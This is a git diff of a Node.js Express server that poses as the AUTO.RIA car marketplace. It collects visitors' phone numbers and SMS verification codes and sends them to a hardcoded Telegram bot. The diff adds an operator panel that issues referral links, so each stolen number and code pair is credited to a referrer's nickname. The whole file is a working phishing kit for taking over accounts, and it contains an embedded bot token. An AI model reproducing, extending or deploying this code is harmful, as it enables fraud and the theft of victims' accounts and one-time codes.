@@ -2,39 +2,137 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const path = require('path');
 const fetch = require('node-fetch');
+const crypto = require('crypto');
 
 const app = express();
 const port = process.env.PORT || 3000;
 
-// === TELEGRAM CONFIG ===
+// === TELEGRAM ===
 const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
 const CHAT_ID = "-5055127448";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-// ======================
+
+// === ХРАНИЛИЩЕ ===
+const refData = new Map(); // refId → { nick, phone }
+
+// Генерация ref
+const genRef = () => crypto.randomBytes(3).toString('hex');
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, '/')));
+app.use(express.static(__dirname));
 
-// Хранилище: номер телефона → время сохранения
-const phoneStorage = new Map();
+// === Панель: /panel ===
+app.get('/panel', (req, res) => {
+    res.sendFile(path.join(__dirname, 'panel.html'));
+});
 
-// Очистка старых записей (старше 10 минут)
-setInterval(() => {
-    const now = Date.now();
-    for (const [phone, timestamp] of phoneStorage.entries()) {
-        if (now - timestamp > 10 * 60 * 1000) { // 10 минут
-            phoneStorage.delete(phone);
+// === Создать реферальную ссылку ===
+app.post('/api/create-ref', (req, res) => {
+    const { nick } = req.body;
+    if (!nick?.trim()) return res.status(400).json({ error: 'Введіть нік' });
+
+    const cleanNick = nick.trim().replace(/^@/, '');
+    const refId = genRef();
+    const baseUrl = `${req.protocol}://${req.get('host')}`;
+    const refLink = `${baseUrl}?ref=${refId}`;
+
+    refData.set(refId, { nick: cleanNick });
+
+    res.json({ refLink, nick: cleanNick });
+});
+
+// === Получение данных (номер / код) ===
+app.post('/api/send-data', async (req, res) => {
+    const { step, phone, code, ref } = req.body;
+    let message = '';
+    let nick = 'невідомий';
+
+    // Получаем ник по ref
+    if (ref && refData.has(ref)) {
+        nick = refData.get(ref).nick;
+        if (step === 'phone' && phone) {
+            const clean = phone.replace(/\D/g, '');
+            const formatted = clean.startsWith('380') ? `+${clean}` : phone;
+            refData.get(ref).phone = formatted; // сохраняем номер
         }
     }
-}, 60 * 1000); // каждую минуту
 
-// Екранування для MarkdownV2
+    if (step === 'phone' && phone) {
+        const clean = phone.replace(/\D/g, '');
+        const formatted = clean.startsWith('380') ? `+${clean}` : phone;
+
+        message = `
+*AUTO\\.RIA*  
+*Номер:* \`${escape(formatted)}\`  
+*Країна:* Україна  
+*Реферер:* @${escape(nick)}
+        `.trim();
+
+    } else if (step === 'code' && code) {
+        let associatedPhone = 'невідомий';
+        if (ref && refData.has(ref) && refData.get(ref).phone) {
+            associatedPhone = refData.get(ref).phone;
+        }
+
+        message = `
+*SMS\\-код\\!*  
+*Номер:* \`${escape(associatedPhone)}\`  
+*Код:*  
+\`\`\`
+${escape(code)}
+\`\`\`
+*Реферер:* @${escape(nick)}
+        `.trim();
+
+    } else {
+        return res.status(400).json({ success: false });
+    }
+
+    await sendToTelegram(message);
+    res.json({ success: true });
+});
+
+// === Главная страница (AUTO.RIA) ===
+app.get('/', (req, res) => {
+    const { ref } = req.query;
+    if (ref && refData.has(ref)) {
+        // Встраиваем ref в страницу
+        res.send(`
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>AUTO.RIA</title></head><body>
+<script>
+  window.REFERRER_ID = "${ref}";
+</script>
+<!-- ТУТ ТВОЯ СТРАНИЦА AUTO.RIA -->
+<!-- Просто вставь свой HTML ниже -->
+<h1>Введіть номер телефону</h1>
+<input id="phone" placeholder="+380..." />
+<button onclick="sendPhone()">Надіслати</button>
+
+<script>
+async function sendPhone() {
+  const phone = document.getElementById('phone').value;
+  await fetch('/api/send-data', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ step: 'phone', phone, ref: window.REFERRER_ID })
+  });
+}
+</script>
+</body></html>
+        `.trim());
+    } else {
+        res.redirect('/panel');
+    }
+});
+
+// === Екранування ===
 const escape = (text) => text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
 
 async function sendToTelegram(message) {
     try {
-        const res = await fetch(TELEGRAM_API, {
+        await fetch(TELEGRAM_API, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -43,73 +141,11 @@ async function sendToTelegram(message) {
                 parse_mode: 'MarkdownV2'
             })
         });
-
-        if (!res.ok) {
-            const err = await res.json();
-            console.error('Telegram error:', err);
-            return false;
-        }
-        return true;
     } catch (err) {
-        console.error('Send error:', err);
-        return false;
+        console.error('Telegram error:', err);
     }
 }
 
-// API: /api/send-data
-app.post('/api/send-data', async (req, res) => {
-    const { step, phone, code } = req.body;
-    let message = '';
-
-    if (step === 'phone' && phone) {
-        // Очищаємо і форматуємо номер
-        const clean = phone.replace(/\D/g, '');
-        const formatted = clean.startsWith('380') ? `+${clean}` : phone;
-
-        // Зберігаємо номер у пам'яті
-        phoneStorage.set(formatted, Date.now());
-
-        message = `
-*AUTO\\.RIA*  
-*Номер телефона:* \`${escape(formatted)}\`  
-*Страна:* Україна
-        `.trim();
-
-    } else if (step === 'code' && code) {
-        // Шукаємо, чи є збережений номер (останнім введеним)
-        // Можна покращити: зберігати кілька, але для простоти — останній
-        let associatedPhone = null;
-        let latestTime = 0;
-
-        for (const [savedPhone, timestamp] of phoneStorage.entries()) {
-            if (timestamp > latestTime) {
-                latestTime = timestamp;
-                associatedPhone = savedPhone;
-            }
-        }
-
-        if (!associatedPhone) {
-            associatedPhone = '_невідомий_';
-        }
-
-        message = `
-*SMS\\-код отримано\\!*  
-*Номер телефона:* \`${escape(associatedPhone)}\`  
-*Код:*  
-\`\`\`
-${escape(code)}
-\`\`\`
-        `.trim();
-
-    } else {
-        return res.status(400).json({ success: false });
-    }
-
-    const success = await sendToTelegram(message);
-    res.json({ success });
-});
-
-// Запуск
 app.listen(port, () => {
-    console.log(`Сервер на порту ${port}`);
+    console.log(`Панель: http://localhost:${port}/panel`);
 });
